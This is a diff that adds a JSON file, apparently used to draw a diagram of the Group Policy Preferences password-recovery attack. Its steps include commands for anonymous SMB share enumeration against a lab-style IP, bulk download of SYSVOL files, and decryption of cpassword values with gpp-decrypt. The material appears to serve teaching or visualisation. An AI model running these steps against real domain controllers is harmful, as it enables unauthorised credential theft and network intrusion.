@@ -1,0 +1,116 @@
+{
+  "title": "GPP Password Recovery",
+  "version": "3.0",
+  "entities": [
+    {
+      "id": "attacker_machine",
+      "label": "Attacker Toolkit",
+      "type": "container",
+      "icon": "IconTerminal",
+      "members": [
+        "gpp_tool",
+        "plaintext_credential"
+      ],
+      "position": {
+        "x": 512.05,
+        "y": 76
+      }
+    },
+    {
+      "id": "gpp_tool",
+      "label": "smbclient / gpp-decrypt",
+      "type": "node",
+      "icon": "IconCode",
+      "position": {
+        "x": 416.5,
+        "y": 76
+      }
+    },
+    {
+      "id": "plaintext_credential",
+      "label": "Plaintext Password",
+      "type": "node",
+      "icon": "IconKey",
+      "position": {
+        "x": 607.6,
+        "y": 76
+      }
+    },
+    {
+      "id": "corporate_network",
+      "label": "Corporate Network",
+      "type": "container",
+      "icon": "IconNetwork",
+      "members": [
+        "domain_controller"
+      ],
+      "position": {
+        "x": 78.39999999999998,
+        "y": 76
+      }
+    },
+    {
+      "id": "domain_controller",
+      "label": "SYSVOL (Domain Controller)",
+      "type": "node",
+      "icon": "IconFolder",
+      "position": {
+        "x": 78.39999999999998,
+        "y": 76
+      }
+    }
+  ],
+  "steps": [
+    {
+      "id": 1,
+      "name": "Launch Share Enumeration Workflow",
+      "type": "edge",
+      "from": "attacker_machine",
+      "to": "gpp_tool",
+      "description": "The attacker uses share-enumeration and SMB client tooling to hunt for legacy GPP XML files.",
+      "cli": "crackmapexec smb 10.129.2.16 -u '' -p '' --shares\nsmbclient -L \\\\10.129.2.16\\"
+    },
+    {
+      "id": 2,
+      "name": "Reach Policy Share Surface",
+      "type": "edge",
+      "from": "gpp_tool",
+      "to": "corporate_network",
+      "description": "The attacker reaches the corporate share path where SYSVOL or replication data is hosted."
+    },
+    {
+      "id": 3,
+      "name": "Browse and Download XML Artifacts",
+      "type": "edge",
+      "from": "corporate_network",
+      "to": "domain_controller",
+      "description": "The readable policy share exposes preference XML files containing legacy cpassword values.",
+      "cli": "prompt off\nrecurse on\nmget *"
+    },
+    {
+      "id": 4,
+      "name": "Return Candidate GPP Files",
+      "type": "edge",
+      "from": "domain_controller",
+      "to": "gpp_tool",
+      "description": "The XML files are copied locally for offline inspection and decryption."
+    },
+    {
+      "id": 5,
+      "name": "Decrypt Legacy Password",
+      "type": "edge",
+      "from": "gpp_tool",
+      "to": "plaintext_credential",
+      "description": "The cpassword value is decrypted locally with the known GPP static key.",
+      "cli": "gpp-decrypt <cpassword>"
+    }
+  ],
+  "visibility": {
+    "plaintext_credential": {
+      "start": 5,
+      "end": 100
+    }
+  },
+  "attackMatrixOpen": false,
+  "sizeControlsOpen": false
+}
